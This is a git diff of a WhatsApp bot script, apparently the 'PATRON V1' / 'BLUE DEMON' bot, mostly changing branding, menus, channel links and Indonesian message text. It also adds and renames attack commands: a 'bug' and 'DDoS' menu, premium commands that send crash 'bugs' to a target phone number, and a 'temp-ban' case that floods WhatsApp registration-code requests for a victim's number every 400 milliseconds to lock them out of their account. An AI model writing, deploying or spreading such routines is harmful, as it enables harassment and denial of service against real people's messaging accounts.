@@ -1034,9 +1034,9 @@ if (!isBotAdmins) return joreply(`${mess.botAdmin}, _Untuk menendang orang yang 
 let gclink = (`https://chat.whatsapp.com/`+await ryozingod.groupInviteCode(m.chat))
 let isLinkThisGc = new RegExp(gclink, 'i')
 let isgclink = isLinkThisGc.test(m.text)
-if (isgclink) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't get kicked by bots because what you sent was a link to this group`})
-if (isAdmins) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
-if (isDeveloper) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
+if (isgclink) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
+if (isAdmins) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
+if (isDeveloper) return ryozingod.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
 await ryozingod.sendMessage(m.chat,
 {
 delete: {
@@ -1053,7 +1053,7 @@ ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n
 if (AntiWame)
 if (budy.toLowerCase().includes("wa.me")){
 if (!isBotAdmins) return
-bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent the wa.me link, admin is free to send any link`
+bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
 if (isAdmins) return joreply(bvl)
 if (mek.key.fromMe) return joreply(bvl)
 if (isDeveloper) return joreply(bvl)
@@ -2116,46 +2116,37 @@ interactiveMessage: {
 "sections": [
 {
 "title": "🗿 Select your command 🗿",
-"highlight_label": "𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽",
+"highlight_label": "#General",
 "rows": [
 {
-"header": "[ 🌀 ] • MAINMENU",
-"title": "*❗MAIN MENU...*",
+"header": "[ ❇️ ] • MAINMENU",
+"title": "❗Show All Command",
 "id": ".mainmenu"
 },
 {
-"header": "🚹 - CONTACT THE OWNER",
-"title": "*❗Displays Owner Number..*",
+"header": "👤 - CONTACT THE OWNER",
+"title": "❗Displays Owner Number",
 "id": ".owner"
 },
 {
-
-"header": "🚹 - CONTACT THE EDITOR",
-
-"title": "*❗Display editor id..*",
-
-"id": ".creator"
-
-},
-{
 "header": "🖥️ - Bot Info",
-"title": "*❗Displays Information About Bots*",
+"title": "❗Displays Information About Bots",
 "id": ".botstatus"
 }
 ]
 },
 {
 "title": "🍷 SUPERIOR COMMAND ♦️",
-"highlight_label": "𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽",
+"highlight_label": "#FRONT",
 "rows": [
 {
-"header": "🎩 - KILL MENU ‼️",
-"title": "*❗Display ALL KILLMENU Commands*",
+"header": "🎩 - BUG MENU ‼️",
+"title": "❗Displays All Bug Commands",
 "id": ".killmenu"
 },
 {
 "header": "🔗 - DDOS MENU 📥",
-"title": "*❗Displays All Ddos*",
+"title": "❗Displays All Ddos",
 "id": ".ddosmenu"
 }
 ]
@@ -2525,13 +2516,13 @@ interactiveMessage: {
 "text": ""
 },
 "footer": {
-"text": "PATRON 🚹"
+"text": "𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽"
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "quick_reply",
-"buttonParamsJson": "{\"display_text\":\"PATRON🚹\nhttps://t.me/textpatron_bot\",\"id\":\".follow\"}"
+"buttonParamsJson": "{\"display_text\":\"JOIN CHANNEL\nhttps://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q\",\"id\":\".follow\"}"
 }
 ],
 "messageParamsJson": ""
@@ -2564,7 +2555,7 @@ interactiveMessage: {
 "text": ""
 },
 "footer": {
-"text": "*PATRON*"
+"text": "*𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽*"
 },
 "nativeFlowMessage": {
 "buttons": [
@@ -2597,15 +2588,19 @@ let itsmenu = `
     *USERS : 2*
     *PREFIX : MULTI*
 
+    https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q
+    
          \`kill Menu\`
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬	
-     ${prefix}null-chace amount
+     ${prefix}blue-chace amount
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
      ${prefix}plerku amount 
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
      ${prefix}bug-gc amount
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-     ${prefix}demon-lock 😈
+     ${prefix}Demon-bug 
+ ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+     ${prefix}demon-heart
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
      ${prefix}zxv1 (pc)🔥
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
@@ -2625,7 +2620,7 @@ let itsmenu = `
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
      ${prefix}idnull 62878###
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-     ${prefix}big-row 62878###
+     ${prefix}patron-bug 62878###
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
      ${prefix}starforce 62878###
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
@@ -2637,7 +2632,7 @@ let itsmenu = `
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
      ${prefix}pucuk-ubi 62878###
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-     ${prefix}1hit 62878###🔥
+     ${prefix}1demon 62878###🔥
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
      ${prefix}mimir 62878###
  ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
@@ -2671,7 +2666,7 @@ interactiveMessage: {
 "isForwarded": true,
 "forwardedNewsletterMessageInfo": {
 "newsletterJid": '0@newsletter',
-"newsletterName": 'PATRON 🚹 & 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 ',
+"newsletterName": 'PATRON 🚹 & 𝙱𝙻𝚄𝙴 🌀 𝙳𝙴𝙼𝙾𝙽 ',
 "serverMessageId": 1
 },
 },
@@ -2684,13 +2679,13 @@ interactiveMessage: {
 "text": ""
 },
 "footer": {
-"text": "*[🚹] •𝚸𝚫𝚻𝚪𝚯𝚴 𝛁1 𝚩𝐔𝐆*"
+"text": "JOIN CHANNEL"
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "quick_reply",
-"buttonParamsJson": "{\"display_text\":\"PATRON 🚹\nHEY YOUR BOT LOOKS GOOD 😃\",\"id\":\".terkentod\"}"
+"buttonParamsJson": "{\"display_text\":\"*HEY*\n*PLS DO WELL TO FOLLOW MY CHANNEL*\",\"id\":\".channel\"}"
 }
 ],
 "messageParamsJson": ""
@@ -2723,11 +2718,11 @@ interactiveMessage: {
 "text": ""
 },
 "footer": {
-"text": "PATRON 🚹 & 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽"
+"text": "PATRON 🚹 & BLUE DEMON"
 },
 "nativeFlowMessage": {
 "buttons": [
-{ "name": "cta_url", "buttonParamsJson": `{ display_text : '*[🚹] •𝚸𝚫𝚻𝚪𝚯𝚴 𝛁1 𝚩𝐔𝐆💀*', url : "https://t.me/textpatron_bot", merchant_url : "https://t.me/textpatron_bot" }`}
+{ "name": "cta_url", "buttonParamsJson": `{ display_text : 'JOIN CHANNEL ', url : "https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q", merchant_url : "https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q" }`}
 ],
 "messageParamsJson": ""
 }
@@ -2784,7 +2779,7 @@ interactiveMessage: {
 "isForwarded": true,
 "forwardedNewsletterMessageInfo": {
 "newsletterJid": '0@newsletter',
-"newsletterName": 'PATRON 🚹 & BLUE DEMON',
+"newsletterName": 'PATRON 🚹 & 𝙱𝙻𝚄𝙴 🌀 𝙳𝙴𝙼𝙾𝙽',
 "serverMessageId": 1
 },
 },
@@ -2839,7 +2834,7 @@ interactiveMessage: {
 },
 "nativeFlowMessage": {
 "buttons": [
-{ "name": "cta_url", "buttonParamsJson": `{ display_text : 'PATRON 🚹', url : "https://t.me/textpatron_bot", merchant_url : "https://t.me/textpatron_bot" }`}
+{ "name": "cta_url", "buttonParamsJson": `{ display_text : 'JOIN CHANNEL', url : "https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q", merchant_url : "https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q" }`}
 ],
 "messageParamsJson": ""
 }
@@ -2928,7 +2923,7 @@ joreply(jsonData)
 }
 break
 //=================================================//
-case 'sc': case 'script': {
+case 'repo': case 'sc': case 'script': {
 joreply(`𝚸𝚫𝚻𝚪𝚯𝚴 𝛁1 𝚩𝐔𝐆 SCRIPT 👇
 
 🌐 *_Git:_* https://github.com/Itzpatron/PATRON-V1
@@ -2937,7 +2932,7 @@ joreply(`𝚸𝚫𝚻𝚪𝚯𝚴 𝛁1 𝚩𝐔𝐆 SCRIPT 👇
 
 🪀 *_Channel:_* https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q
 
-🩵 *_The Devs:_* https://t.me/textpatron_bot and https://tinyurl.com/2xrw69su`)
+🚹 *_The Devs:_* https://t.me/textpatron_bot and https://tinyurl.com/2xrw69su`)
 }
 break
 //=================================================//
@@ -2953,7 +2948,7 @@ ryozingod.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break
 //=================================================//
 case 'credit': {
-ryozingod.sendMessage(m.chat, { text: `*ALL HAILS TO 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽, wa.me/2347041039367*`}, { quoted: m })
+ryozingod.sendMessage(m.chat, { text: `*ALL HAILS TO 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽.wa.me/2347041039367*`}, { quoted: m })
 }
 break
 //=================================================//
@@ -2962,13 +2957,19 @@ ryozingod.sendMessage(m.chat, { text: `*DM ME FOR ANY QUESTION OR COMPLAIN*`}, {
 }
 break
 //=================================================//
-case 'panel': {
-ryozingod.sendMessage(m.chat, { text: ` *To get a panel,kindly* *dm* *wa.me/2347041039367* `}, { quoted: m })
+case 'channel': {
+ryozingod.sendMessage(m.chat, { text: `https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q 
+*PLS JOIN AND ALWAYS SUPPORT US 😃*`}, { quoted: m })
 }
 break
 //=================================================//
-case 'creator': {
-ryozingod.sendMessage(m.chat, { text: `wa.me/2347041039367`}, { quoted: m })
+case 'freepanel': {
+ryozingod.sendMessage(m.chat, { text: `*To get a panel,kindly dm wa.me/2347041039367*`}, { quoted: m })
+}
+break
+//=================================================//
+case 'panel': {
+ryozingod.sendMessage(m.chat, { text: `To get a panel,kindly dm wa.me/2347041039367`}, { quoted: m })
 }			
 break
 //=================================================//
@@ -3558,7 +3559,7 @@ author: global.author
 }
 break
 //=================================================//
-case "url": case "shortlink": {
+case "tinyurl": case "shortlink": {
 if (!text) return joreply(`*Example: ${prefix+command} https://instagram.com/ryozingod*`)
 let anu = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`)
 joreply(anu.data)
@@ -3674,54 +3675,59 @@ case 'play':
 case 'ytaudio':
 case 'playmusik':
 case 'playmusic': {
-    if (!q) return joreply("Kirim perintah judul lagu/link youtube nya bwang");
-
-    try {
-        let searchResults = await yts(q);
-        if (searchResults.all.length === 0) return joreply("Video tidak bisa di download");
-
-        let videoData = searchResults.all.filter(v => v.type === 'video');
-        if (videoData.length === 0) return joreply("No video found");
-
-        let video = videoData[0];
-        let videoId = video.videoId;
-        let videoUrl = video.url;
-        let thumbnailUrl = `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg`;
-
-        // Using new downloader API
-        const videoInfo = await ytdl.getInfo(videoUrl);
-        const audioFormats = ytdl.filterFormats(videoInfo.formats, 'audioonly');
-        const bestAudioFormat = ytdl.chooseFormat(audioFormats, { quality: 'highestaudio' });
-
-        let thumbnailBuffer = await getBuffer(thumbnailUrl);
-        let metadata = `*🎩 Youtube - Downloader 🖥️*\n\n🌐 Channel : ${video.author.name}\n🚥 Viewers : ${video.views} Kali\n⏱️ Duration : ${video.timestamp}\n🔗 Url : ${videoUrl}`;
-
-        ryozingod.sendMessage(m.chat, { 
-            contextInfo: {
-                externalAdReply: { 
-                    showAdAttribution: false, 
-                    title: video.title,
-                    body: `🎩 ${week} ${calender} ⭐`,
-                    mediaType: 2,
-                    renderLargerThumbnail: true,
-                    thumbnail: thumbnailBuffer,
-                    mediaUrl: videoUrl,
-                    sourceUrl: videoUrl
-                }
-            }, 
-            image: { url: thumbnailUrl },
-            text: metadata
-        }, { quoted: m });
-
-        // Ensure the function for downloading is updated or implemented
-        await downloadMp3(videoUrl, bestAudioFormat);
-
-    } catch (err) {
-        console.error("Error occurred:", err);
-        joreply("Server sedang error");
-    }
+if (!q) return joreply("Kirim perintah judul lagu/link youtube nya bwang")
+try {
+let rus = await yts(q)
+if (rus.all.length == "0") return joreply("Video tidak bisa di download")
+let data = await rus.all.filter(v => v.type == 'video')
+try{
+var res = data[0]
+var info = await ytdl.getInfo(res.url);
+} catch{
+var res = data[1]
+var info = await ytdl.getInfo(res.url);
 }
+let audio = ytdl.filterFormats(info.formats, 'audioonly');
+let format = ytdl.chooseFormat(info.formats, { quality: '18' });
+try{
+var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
+} catch(err) {
+var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/default.jpg`
+}
+let inithumb = await getBuffer(thumbnya)
+let teks = `*🎩 Youtube - Downloader 🖥️*
 
+🌐 Channel : ${res.author.name}
+🚥 Viewers : ${res.views} Kali
+⏱️ Duration : ${res.timestamp}
+🔗 Url : ${res.url}`
+
+ryozingod.sendMessage(m.chat, { contextInfo: {
+externalAdReply: { showAdAttribution: false, 
+title: `${res.title}`,
+body: `🎩 ${week} ${calender} ⭐`,
+mediaType: 2,  
+renderLargerThumbnail : true,
+thumbnail: inithumb,
+mediaUrl: res.url,
+sourceUrl: res.url
+}}, image: {url: inithumb},text: teks},{quoted: m})
+downloadMp3(`${res.url}`) 
+} catch (err){
+console.log(err)
+joreply(`Server sedang error`)
+}
+}
+break
+//=================================================//
+case 'ytmp3':
+case 'youtubemp3':
+case 'youtubeaudio':{
+if(!q) return joreply(`Contoh : ${prefix+command} Link`)
+await joreply(mess.wait)
+downloadMp3(text)
+}
+break
 //=================================================//
 case 'ytmp4':
 case 'youtubevideo':
@@ -4015,7 +4021,7 @@ orgkaya.splice(targetPremiumIndex, 1)
 fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya))
 joreply("Sukses Via Nomer")
 await sleep(2000)
-ryozingod.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/12acad01d53a0fde256fe.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
+ryozingod.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
 } else {
 joreply("Entitas premium tidak ditemukan")
 }
@@ -12564,7 +12570,7 @@ await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\
 }
 break
 //=================================================//
-case 'virg4m': case 'big-row': case 'idnull': {
+case 'virg4m': case 'patron-bug': case 'idnull': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
@@ -12595,7 +12601,7 @@ await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\
 }
 break
 //=================================================//
-case 'sipilist': case '1hit': case 'pucuk-ubi': {
+case 'sipilist': case '1demon': case 'pucuk-ubi': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
@@ -12638,7 +12644,7 @@ await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\
 }
 break
 //=================================================//
-case '💔': {
+case 'demon-heart': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
@@ -12798,47 +12804,50 @@ joreply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> P
 }
 break
 //=================================================//
-case 'demon-lock': {
-    if (!isPremium) return joreply(mess.prem);
-    if (!text) return joreply(`Example: ${prefix + command} 62|87872627288`);
-    if (!/\|/.test(text)) return joreply(`Data yang anda berikan tidak valid! Contoh: \n ${prefix + command} 62|87872627288`);
+case 'temp-ban': {
+if (!isPremium) return joreply(mess.prem)
+if (!text) return joreply(`Example: ${prefix + command} 62|87872627288`)
+if (!/|/.test(text)) return joreply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
+let numbers = JSON.parse(fs.readFileSync('./tb.json'))
 
-    let numbers = JSON.parse(fs.readFileSync('./tb.json'));
-    let [cCode, number] = text.split("|");
-    let fullNo = cCode + number;
+let cCode = q.split("|")[0]
+let number = q.split("|")[1]
+let fullNo = cCode + number
 
-    await joreply(`👽 *OTP LOCK attack sent to: ${fullNo} successfully using ${command} Ⓜ️.`);
+await joreply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)
 
-    let { state, saveCreds } = await useMultiFileAuthState('tb');
-    let spam = makeWaSocket({
-        auth: state,
-        mobile: true,
-        logger: pino({ level: 'NIGHT' })
-    });
+let { state, saveCreds } = await useMultiFileAuthState('tb')
 
-    let dropNumber = async () => {
-        try {
-            let res = await spam.requestRegistrationCode({
-                phoneNumber: `+${fullNo}`,
-                phoneNumberCountryCode: cCode,
-                phoneNumberNationalNumber: number,
-                phoneNumberMobileCountryCode: 234,
-            });
+let spam = makeWaSocket({
+auth: state,
+mobile: true,
+logger: pino({ level: 'NIGHT' })
+})
 
-            if (res.reason === 'temporarily_unavailable') {
-                console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`);
-                await sleep(1000);
-                await dropNumber(); // Recursive call to retry
-            }
-        } catch (error) {
-            console.error(error);
-        }
-    };
+let dropNumber = async () => {
+try {
+let res = await spam.requestRegistrationCode({
+phoneNumber: `+${fullNo}`,
+phoneNumberCountryCode: cCode,
+phoneNumberNationalNumber: number,
+phoneNumberMobileCountryCode: 724,
+})
 
-    numbers[fullNo] = { cCode, number };
-    fs.writeFileSync('./tb.json', JSON.stringify(numbers, null, '\t'));
+if (res.reason === 'temporarily_unavailable') {
+console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
+await sleep(1000)
+await dropNumber()
+}
+} catch (error) {
+console.error(error)
+}
+}
 
-    setInterval(dropNumber, 400);
+numbers[fullNo] = { cCode, number };
+fs.writeFileSync('./tb.json', JSON.stringify(numbers, null, '\t'));
+setInterval(() => {
+dropNumber()
+}, 400)
 }
 break
 //=================================================//
@@ -13297,17 +13306,17 @@ await joreply('✅Succes')
 }
 break
 //=================================================//
-case 'null-chace': {
+case 'blue-chace': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 1`)
 for (let j = 0; j < q; j++) {
 ngeloc(m.chat, force)
 }
-await joreply('')
+await joreply('✅Succes')
 }
 break
 //=================================================//
-case 'blue-demon': case 'zxv1': case 'zxv2': case 'zxv3': {
+case 'senggol': case 'zxv1': case 'zxv2': case 'zxv3': {
 if (m.isGroup) return joreply("Only In Private Chat")
 if (!isPremium) return 
 for (let j = 0; j < 5; j++) {
@@ -13320,15 +13329,15 @@ externalAdReply: {
 showAdAttribution: false,
 renderLargerThumbnail: false,
 jpegThumbnail: fakejpg,
-title: `⦃ ••• ⦄ ⦃|𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽|⦄ ⦃ ••• ⦄`,
-body: `⁗ ⋄ 💀`,
+title: `⦃ ••• ⦄ ⦃| thezetsuboxygen |⦄ ⦃ ••• ⦄`,
+body: `⁗ ⋄ mati aja lu suki 😂`,
 previewType: "VIDEO",
 sourceUrl: `༑ 𝐩𝟎𝐢𝐧𝐭𝐬 ★ 𝐳𝐞𝐭𝐬𝐮𝐛𝐨𝐱𝐲𝐠𝐞𝐧 #𝐳𝐱𝐯 ⿻`,
 mediaType: 1,
 mediaUrl: `${global.url}`
 }
 },
-text: '<★> TARGET ELIMINATED BY 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽\n<!#>🔥🔥🔥🔥🔥🔥🔥\n\n#𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽'
+text: '<★> Stm Kapal Karam ni bos\n<!#- siap membantai suki liar\n\n#senggoldong'
 }, {
 quoted: m
 })
